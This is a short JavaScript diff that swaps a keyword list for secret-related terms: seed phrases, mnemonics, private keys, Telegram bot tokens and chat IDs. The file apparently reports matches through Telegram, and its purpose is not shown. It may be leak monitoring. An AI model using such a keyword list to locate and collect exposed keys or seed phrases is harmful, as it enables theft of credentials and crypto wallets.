@@ -5,8 +5,14 @@ const pool = require("./db");
 const sendTelegram = require("./telegram");
 
 const KEYWORDS = [
-  "yourdomain.com",
-  "projectphoenix"
+  "botToken",
+  "chatId",
+  "chat_id",
+  "MNEMONIC",
+  "SEED_PHRASE",
+  "-BEGIN PRIVATE KEY-",
+  "https://api.telegram.org/bot",
+  "PRIVATE_KEY"
 ];
 
 const sleep = (ms) =>
